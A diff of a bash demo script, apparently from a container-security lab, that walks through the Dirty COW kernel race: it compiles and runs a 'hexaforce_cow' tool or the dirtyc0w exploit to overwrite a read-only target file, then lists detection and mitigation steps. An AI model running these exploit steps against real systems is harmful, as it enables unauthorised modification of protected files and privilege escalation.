@@ -38,41 +38,50 @@ stage_1() {
     echo -e "  an unprivileged process inside a container can bypass memory writing rules."
     echo ""
 
-    # 2. Exploit
-    echo -e "${YELLOW}[2. THE EXPLOIT: Compiling & Triggering Race Threads]${NC}"
+    # 2. Probe — non-destructive vulnerability fingerprint
+    echo -e "${YELLOW}[2. THE PROBE: Kernel Vulnerability Fingerprint]${NC}"
+    gcc -pthread -O2 hexaforce_cow.c -o hexaforce_cow -lrt 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo -e "  - Compiled Hexa Force COW Analysis Tool successfully."
+        echo ""
+        ./hexaforce_cow --probe
+        echo ""
+    else
+        echo -e "  - ${RED}Compilation failed!${NC}"
+    fi
+
+    # 3. Exploit — controlled race with instrumentation
+    echo -e "${YELLOW}[3. THE EXPLOIT: Instrumented Race Condition Trigger]${NC}"
     TARGET_FILE="/var/secret/target.txt"
     echo -e "  - Target File: $TARGET_FILE (Owner: $(stat -c '%U' "$TARGET_FILE"), Perms: $(stat -c '%A' "$TARGET_FILE"))"
     echo -e "  - Original Contents: \"$(cat "$TARGET_FILE")\""
+    echo ""
     
-    gcc -pthread dirtyc0w.c -o dirtyc0w
-    if [ $? -eq 0 ]; then
-        echo -e "  - Compiled dirtyc0w successfully. Overwriting target file..."
-        ./dirtyc0w "$TARGET_FILE" "DIRTY_COW_SUCCESS!!!" > /dev/null 2>&1
-        
-        # Verify success
-        RESULT=$(cat "$TARGET_FILE")
-        echo -e "  - Overwrite result: \"${CYAN}${RESULT}${NC}\""
-        if [ "$RESULT" == "DIRTY_COW_SUCCESS!!!" ]; then
-            echo -e "  - ${RED}Exploit Succeeded: The read-only root file was modified!${NC}"
-        else
-            echo -e "  - ${GREEN}Exploit Prevented: The host kernel serialized writes correctly.${NC}"
-        fi
+    if [ -f "./hexaforce_cow" ]; then
+        ./hexaforce_cow --exploit "$TARGET_FILE" "HEXA_FORCE_PWNED"
     else
-        echo -e "  - ${RED}Exploit failed to compile!${NC}"
+        echo -e "  - ${RED}Hexa Force tool not available, falling back to legacy exploit${NC}"
+        gcc -pthread dirtyc0w.c -o dirtyc0w 2>/dev/null
+        if [ $? -eq 0 ]; then
+            ./dirtyc0w "$TARGET_FILE" "DIRTY_COW_SUCCESS!!!" > /dev/null 2>&1
+            echo -e "  - Post-exploit content: \"$(cat "$TARGET_FILE")\""
+        fi
     fi
     echo ""
 
-    # 3. Detection
-    echo -e "${YELLOW}[3. DETECTION STRATEGY: System Call Auditing]${NC}"
+    # 4. Detection
+    echo -e "${YELLOW}[4. DETECTION STRATEGY: System Call Auditing]${NC}"
     echo -e "  - Monitor syscall activity for high-frequency calls to ${CYAN}madvise(..., MADV_DONTNEED)${NC}."
     echo -e "  - Trigger alerts when processes open and write to ${CYAN}/proc/self/mem${NC} concurrently."
+    echo -e "  - Deploy Falco runtime rules to detect concurrent madvise+write patterns."
     echo ""
 
-    # 4. Mitigation
-    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Patching & Sandboxing]${NC}"
-    echo -e "  - ${GREEN}Primary: Upgrade the host kernel to a patched release.${NC}"
-    echo -e "  - Secondary: Employ secure micro-VM runtimes like ${CYAN}gVisor${NC} or ${CYAN}Kata Containers${NC}."
-    echo -e "    These sandboxes intercept and handle system calls in a user-space kernel proxy,"
+    # 5. Mitigation
+    echo -e "${YELLOW}[5. MITIGATION BLUEPRINT: Patching & Sandboxing]${NC}"
+    echo -e "  - ${GREEN}Primary: Upgrade the host kernel to a patched release (FOLL_COW fix).${NC}"
+    echo -e "  - Secondary: Apply custom Seccomp profiles to block madvise at the syscall boundary."
+    echo -e "  - Tertiary: Employ micro-VM runtimes like ${CYAN}gVisor${NC} or ${CYAN}Kata Containers${NC}."
+    echo -e "    These sandboxes intercept system calls in a user-space kernel proxy,"
     echo -e "    completely isolating the host kernel from container syscall abuses."
     echo ""
 }
